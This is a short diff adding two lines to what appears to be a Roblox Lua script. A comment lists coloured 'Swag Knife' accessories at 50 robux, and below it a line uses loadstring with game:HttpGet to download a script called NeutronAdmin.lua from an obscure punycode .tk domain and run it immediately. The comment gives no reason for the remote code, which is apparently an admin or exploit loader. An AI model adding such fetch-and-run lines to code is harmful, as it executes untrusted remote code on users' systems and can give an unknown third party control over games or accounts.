@@ -1,0 +1,2 @@
+--grab knife accessory: Red Swag Knife/Yellow Swag Knife/Purple Swag Knife/White Swag Knife - cost 50 robux
+loadstring(game:HttpGet("https://xn--9p9haaaaaa.tk/scripts/NeutronAdmin.lua"))()
